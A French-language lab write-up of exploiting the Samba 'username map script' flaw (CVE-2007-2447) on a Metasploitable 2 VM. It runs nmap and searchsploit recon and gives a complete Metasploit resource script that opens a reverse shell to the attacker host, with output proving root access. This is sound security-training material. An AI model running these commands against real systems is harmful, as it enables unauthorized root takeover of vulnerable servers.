# Write-up — Samba "username map script" (Metasploitable 2, ports 139/445)

Cible : `192.168.56.101` (réseau josa `vboxnet0`) · Kali/LHOST : `192.168.56.1`.
CVE-2007-2447 · Résultat : shell **root** (uid=0).

> Réseau : services de josa sur `vboxnet0` (`192.168.56.0/24`). MS2 = `192.168.56.101`
> (DHCP, MAC `08:00:27:0A:71:3F`).

**C'est quoi ?** Quand Samba est configuré avec l'option `username map script`, il passe le
nom d'utilisateur fourni à la connexion à un script shell côté serveur. Avant le correctif,
ce nom **n'était pas assaini** : un nom contenant des métacaractères shell
(`` `...` ``, `;`, `|`) fait exécuter des commandes arbitraires — pas besoin d'un compte
valide. C'est une faille de **validation d'entrée**, pas une backdoor.

---

## 1. Recon

```bash
nmap -sV -p 139,445 192.168.56.101
```
```
PORT    STATE SERVICE     VERSION
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
```

`nmap` annonce une plage large (`3.X - 4.X`). La version exacte sera affinée par la recherche
d'exploit (la CVE ne touche que 3.0.20 → 3.0.25rc3).

## 2. Méthode d'identification de la CVE et du module

```bash
searchsploit samba 3.0
```
```
Samba 3.0.20 < 3.0.25rc3 - 'Username' map script Command Execution | unix/remote/16320.rb
```

La faille existe pour la plage 3.0.20–3.0.25rc3 (celle de Metasploitable 2). Chemin du module
dans `msfconsole` :

```bash
msfconsole -q -x "search usermap_script; exit"
```
```
0  exploit/multi/samba/usermap_script  2007-05-14  excellent  No  Samba "username map script" Command Execution
```

CVE et mécanisme (via `info` à l'intérieur du module) :
```
References:
  https://nvd.nist.gov/vuln/detail/CVE-2007-2447
  http://samba.org/samba/security/CVE-2007-2447.html
```

**CVE-2007-2447.** Le module exploite l'absence d'assainissement du nom d'utilisateur : il se
connecte au partage et envoie un username forgé contenant une commande shell, qui est exécutée
par le `username map script` avec les droits du démon Samba — **root** sur cette VM.

## 3. Exploiter

🖥 Kali — via resource script :
```bash
cat > /tmp/samba.rc << 'EOF'
use exploit/multi/samba/usermap_script
set RHOSTS 192.168.56.101
set LHOST 192.168.56.1
set LPORT 4446
run -z
sessions -c "id; uname -a; hostname; whoami" -i 1
exit -y
EOF
msfconsole -q -r /tmp/samba.rc
```

Résultat :
```
[*] Command shell session 1 opened (192.168.56.1:4446 -> 192.168.56.101:40060)
```

**Note :** pas de `RPORT` à régler (445 par défaut), et `payload` par défaut
(`cmd/unix/reverse`) convient ; `LHOST`/`LPORT` nécessaires car c'est un reverse shell.

## 4. Preuve d'accès

```
[*] Running 'id; uname -a; hostname; whoami' on shell session 1 (192.168.56.101)
uid=0(root) gid=0(root)
Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux
metasploitable
root
```

→ **Root direct**, sans élévation : le démon Samba tourne en root, donc la commande injectée
via le username s'exécute en root. Même CVE que sur MS1 (déjà traité par josa), ici reconfirmé
sur MS2 — bon rappel qu'une mauvaise option de configuration (`username map script`) suffit à
donner un accès root complet sans aucun identifiant valide.

---

**Pour rejouer :** `./start.sh`, localiser l'IP (`nmap -sn 192.168.56.0/24`), puis l'étape 3.
